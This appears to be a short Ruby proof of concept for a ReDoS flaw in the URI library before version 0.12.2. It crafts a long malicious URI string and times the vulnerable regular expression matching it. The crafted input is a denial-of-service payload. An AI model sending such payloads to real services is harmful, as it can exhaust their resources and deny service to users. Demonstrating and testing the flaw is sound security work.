require 'uri'

# Vulnerable regular expression in URI library (before version 0.12.2)
vulnerable_uri_regex = URI.regexp

# Craft a malicious URI with a repeating pattern that triggers the ReDoS vulnerability
malicious_uri = "http://" + "a" * 5000 + "!"

# Measure the time taken to match the malicious URI with the vulnerable regular expression
start_time = Time.now
vulnerable_uri_regex.match?(malicious_uri)
end_time = Time.now

# Output the time taken for the match operation
puts "Time taken to match: #{end_time - start_time} seconds"
